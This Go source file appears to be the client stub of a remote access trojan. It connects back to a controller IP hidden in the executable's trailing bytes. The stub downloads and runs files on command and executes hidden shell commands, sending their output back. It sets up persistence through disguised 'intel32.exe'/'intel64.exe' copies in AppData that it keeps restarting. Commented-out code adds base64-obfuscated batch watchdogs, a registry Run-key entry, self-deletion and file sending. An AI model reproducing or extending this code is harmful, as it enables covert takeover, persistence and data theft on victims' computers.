package internal

import (
	. "Kyberite/Reaper/rt-stub/util"
	"encoding/json"
	"io/ioutil"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"syscall"
	"time"
	"bytes"
	//"unsafe" 
	"strconv"

	"github.com/mitchellh/go-ps"
)

var homeDir string

type Stub struct {
	conn    net.Conn
	ipaddr	net.IP
	encoder *json.Encoder
	decoder *json.Decoder
	td      string
}

func (stub *Stub) Start() {
	raw_bytes, err := ioutil.ReadFile("Main.exe")

	size := len(raw_bytes)
	stub.ipaddr = net.IP([]byte{raw_bytes[size-4], raw_bytes[size-3], raw_bytes[size-2], raw_bytes[size-1]})
	fmt.Println(stub.ipaddr.String())
	if err != nil{
		fmt.Println(err)
	}
	usr, _ := user.Current()
	homeDir = usr.HomeDir
	for {
		stub.dial()
		time.Sleep(5000000000)
	}
}

func (stub *Stub) dial() {
	var err error
	addr := net.JoinHostPort(stub.ipaddr.String(), strconv.Itoa(int(4731)))
	stub.conn, err = net.Dial("tcp", addr)
	if err != nil {
		fmt.Println(err)
	} else {
		stub.encoder = json.NewEncoder(stub.conn)
		stub.decoder = json.NewDecoder(stub.conn)
		stub.handlePackets()
	}
}

func (stub *Stub) response() {

}


func (stub *Stub) handlePackets() {
	files := map[string]*os.File{}
	for {
		packet := Packet{}
		err := stub.decoder.Decode(&packet)
		fmt.Println(packet.GetForm(), packet.GetStringData())
		if err == io.EOF {
			break
		} else if err != nil {
			return
		} else {
			switch packet.GetForm() {
			case "FILE":
				if _, err := os.Stat(stub.td); os.IsNotExist(err) {
					err := os.MkdirAll(stub.td, os.ModeDir)
					if err != nil {
						fmt.Println(err)
					}
				}
				fileName := stub.td + "\\" + packet.GetStringData()
				if packet.GetComplete() && files[fileName] != nil {
					files[fileName].Close()
					delete(files, fileName)
					fmt.Println("Stub: Finished downloading", packet.GetStringData())
					Exec := exec.Command(files[fileName].Name())
					Exec.Start()
				} else if packet.GetComplete() && files[fileName] == nil {
					continue
				} else {
					if files[fileName] == nil {
						fmt.Println("Stub: Started downloading", packet.GetStringData())
						if _, err := os.Stat(fileName); os.IsNotExist(err) {
							files[fileName], _ = os.Create(fileName)
						} else {
							files[fileName], _ = os.Open(fileName)
						}
					}
					files[fileName].WriteAt(packet.GetFileData(), packet.GetBytePos()*1024)
				}
			case "STARTUP":
				// addStartup()
			case "RMSTARTUP":
				// removeStartup()
			case "PERSISTENCE":
				addPersistence()
			case "RMPERSISTENCE":
				// removePersistence()
			case "UNINSTALL":
				// uninstall()
			case "COMMANDEXEC":
				stub.cmd(packet.GetStringData())
			}
		}
	}
}


func addPersistence() {
	if _, err := os.Stat(homeDir + "\\AppData\\Roaming\\Windows\\"); os.IsNotExist(err) {
		os.Mkdir(homeDir+"\\AppData\\Roaming\\Windows\\", 0777)
	}
	data, _ := Asset("data/persist.exe")

	intel32, _ := os.Create(homeDir + "\\AppData\\Roaming\\Windows\\intel32.exe")
	intel64, _ := os.Create(homeDir + "\\AppData\\Roaming\\Windows\\intel64.exe")

	defer intel32.Close()
	defer intel64.Close()

	intel32.Write(data)
	intel64.Write(data)

	go persist()
}


func openProcess(name string) {
	run := exec.Command("cmd", "/C", "start %APPDATA%\\Windows\\"+name)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	run.Run()
}

func persist() {
	programs := map[string]bool{}
	for {
		programs["winhelp.exe"] = false
		programs["intel32.exe"] = false
		programs["intel64.exe"] = false
		time.Sleep(500000000)
		ls, _ := ps.Processes()
		for _, p := range ls {
			if _, ok := programs[p.Executable()]; ok {
				programs[p.Executable()] = true
			}
		}
		for name, p := range programs {
			if !p {
				openProcess(name)
			}
		}
		
	}
}

func (stub *Stub) cmd(cmd string) {
	run := exec.Command("cmd", "/C", cmd)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var output bytes.Buffer 
	run.Stdout = &output 
	err := run.Run()
	if err != nil {
		fmt.Println(err)
	} 
	fmt.Println(output.String())
	pkt := (Packet{"MESSAGE", output.String(), 0, nil, false})
	stub.encoder.Encode(pkt)
}

//func (stub *Stub) sendFile(fileName string) {
//	buffer := make([]byte, 1024)
//	file, _ := os.Open(fileName)
//	defer file.Close()
//
//	i := 0
//	for {
//		_, err := file.Read(buffer)
//		if err == io.EOF {
//			stub.encoder.Encode(Packet{"FILE", "test.exe", 0, nil, true})
//			break
//		}
//		stub.encoder.Encode(Packet{"FILE", "test.exe", int64(i), buffer, false})
//		i++
//	}
//	stub.encoder.Encode(Packet{"MESSAGE", "DONE", 0, nil, false})
//}
//
//func uninstall() {
//	removeStartup()
//	removePersistence()
//	delSelf()
//}
//
//func delSelf() {
//	var sI syscall.StartupInfo
//	var pI syscall.ProcessInformation
//	argv, _ := syscall.UTF16PtrFromString(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
//	syscall.CreateProcess(
//		nil,
//		argv,
//		nil,
//		nil,
//		true,
//		0,
//		nil,
//		nil,
//		&sI,
//		&pI)
//	os.Exit(0)
//}
//
//func addPersistence() {
//	cmd("mkdir %APPDATA%\\Windows")
//	/*
//		TITLE ms32
//		SETLOCAL EnableExtensions
//		:SEARCH
//		tasklist /fi "WINDOWTITLE eq ms64" | findstr /C:"No tasks are running"
//		if %errorlevel% NEQ 1 (
//		  %APPDATA%\Windows\ms64.bat
//		  timeout 1
//		)
//		set EXE=intel32.exe
//		FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto SEARCH
//		start %APPDATA%\Windows\intel32.exe
//		goto SEARCH
//	*/
//
//	if _, err := os.Stat("%APPDATA%\\Windows\\ms32.bat"); os.IsNotExist(err) {
//		ms32Code := "VElUTEUgbXMzMg0KU0VUTE9DQUwgRW5hYmxlRXh0ZW5zaW9ucw0KOlNFQVJDSA0KdGFza2xpc3QgL2ZpICJXSU5ET1dUSVRMRSBlcSBtczY0IiB8IGZpbmRzdHIgL0M6Ik5vIHRhc2tzIGFyZSBydW5uaW5nIiANCmlmICVlcnJvcmxldmVsJSBORVEgMSAoDQogICVBUFBEQVRBJVxXaW5kb3dzXG1zNjQuYmF0DQogIHRpbWVvdXQgMQ0KKQ0Kc2V0IEVYRT1pbnRlbDMyLmV4ZQ0KRk9SIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFNRSBlcSAlRVhFJSInKSBETyBJRiAlJXggPT0gJUVYRSUgZ290byBTRUFSQ0gNCnN0YXJ0ICVBUFBEQVRBJVxXaW5kb3dzXGludGVsMzIuZXhlDQpnb3RvIFNFQVJDSA=="
//		ms32Decoded, _ := base64.StdEncoding.DecodeString(ms32Code)
//
//		ms32, _ := os.Create(homeDir + "\\Windows\\ms32.bat")
//		ms32.WriteString(string(ms32Decoded))
//		ms32.Close()
//
//		cmd("%APPDATA%\\Windows\\ms32.bat")
//	}
//
//	/*
//		TITLE ms64
//		SETLOCAL EnableExtensions
//		:SEARCH
//		tasklist /fi "WINDOWTITLE eq ms32" | findstr /C:"No tasks are running"
//		if %errorlevel% NEQ 1 (
//		  %APPDATA%\Windows\ms32.bat
//		  timeout 1
//		)
//		set EXE=intel32.exe
//		FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto SEARCH
//		start %APPDATA%\Windows\intel32.exe
//		goto SEARCH
//	*/
//
//	if _, err := os.Stat("%APPDATA%\\Windows\\ms64.bat"); os.IsNotExist(err) {
//		ms64Code := "VElUTEUgbXM2NA0KU0VUTE9DQUwgRW5hYmxlRXh0ZW5zaW9ucw0KOlNFQVJDSA0KdGFza2xpc3QgL2ZpICJXSU5ET1dUSVRMRSBlcSBtczMyIiB8IGZpbmRzdHIgL0M6Ik5vIHRhc2tzIGFyZSBydW5uaW5nIiANCmlmICVlcnJvcmxldmVsJSBORVEgMSAoDQogICVBUFBEQVRBJVxXaW5kb3dzXG1zMzIuYmF0DQogIHRpbWVvdXQgMQ0KKQ0Kc2V0IEVYRT1pbnRlbDMyLmV4ZQ0KRk9SIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFNRSBlcSAlRVhFJSInKSBETyBJRiAlJXggPT0gJUVYRSUgZ290byBTRUFSQ0gNCnN0YXJ0ICVBUFBEQVRBJVxXaW5kb3dzXGludGVsMzIuZXhlDQpnb3RvIFNFQVJDSA=="
//		ms64Decoded, _ := base64.StdEncoding.DecodeString(ms64Code)
//
//		ms64, _ := os.Create(homeDir + "\\Windows\\ms64.bat")
//		ms64.WriteString(string(ms64Decoded))
//		ms64.Close()
//
//		cmd("%APPDATA%\\Windows\\ms64.bat")
//	}
//}
//
//func removePersistence() {
//	/*
//		Taskkill /IM ms32.bat /F
//		Taskkill /IM ms64.bat /F
//	*/
//
//	code := "VGFza2tpbGwgL0lNIG1zMzIuYmF0IC9GDQpUYXNra2lsbCAvSU0gbXM2NC5iYXQgL0Y="
//	decoded, _ := base64.StdEncoding.DecodeString(code)
//
//	persist, _ := os.Create(homeDir + "\\Windows\\end.bat")
//	persist.WriteString(string(decoded))
//	persist.Close()
//
//	cmd("%APPDATA%\\Windows\\end.bat")
//	cmd("del %APPDATA%\\Windows\\ms32.bat")
//	cmd("del %APPDATA%\\Windows\\ms64.bat")
//	cmd("del %APPDATA%\\Windows\\end.bat")
//}
//
//func addStartup() {
//	// REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Intel32 /t REG_SZ /F /D %APPDATA%\Windows\intel32.exe
//	if _, err := os.Stat("%APPDATA%\\Windows\\intel32.exe"); os.IsNotExist(err) {
//		RegAdd := "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBJbnRlbDMyIC90IFJFR19TWiAvRiAvRCAlQVBQREFUQSVcV2luZG93c1xpbnRlbDMyLmV4ZQ=="
//		DecodedReg, _ := base64.StdEncoding.DecodeString(RegAdd)
//
//		cmd("copy " + os.Args[0] + " %APPDATA%\\Windows\\intel32.exe")
//		cmd(string(DecodedReg))
//
//		time.Sleep(1000000000)
//
//		delSelf()
//	}
//}
//
//func removeStartup() {
//	// REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Intel32 /F
//	RegAdd := "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBJbnRlbDMyIC9G"
//	DecodedReg, _ := base64.StdEncoding.DecodeString(RegAdd)
//	cmd(string(DecodedReg))
//}
//
//func cmd(cmd string) {
//	run := exec.Command("cmd", "/C", cmd)
//	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//	run.Run()
//}